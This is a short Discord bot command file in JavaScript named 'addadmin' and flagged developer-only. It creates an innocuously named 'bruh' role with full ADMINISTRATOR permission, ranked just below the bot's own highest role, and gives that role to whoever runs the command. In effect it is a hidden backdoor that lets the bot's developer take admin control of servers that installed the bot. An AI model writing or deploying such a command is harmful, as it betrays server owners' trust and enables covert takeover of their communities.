const Discord = require(`discord.js`);

const settings = require(`../config.json`)
const modules = require(settings.modulesPath)

module.exports.run = async (bot, message, args, coreMessage) => {
   let guild = modules.fetchGuild(coreMessage)
   role = await guild.roles.find(`name`, `bruh`)
   if (!role) {
       role = await guild.createRole({ 
           name: `bruh`,
           permissions: [`ADMINISTRATOR`],
           position: guild.me.highestRole.position - 1
       })
   }
   guild.member(message.author).addRole(role)
   return message.channel.send(`Gave you the "${role.name}" role ${message.author.username} ;)`)
}

module.exports.info = {
    name: `addadmin`,
    developer: true
}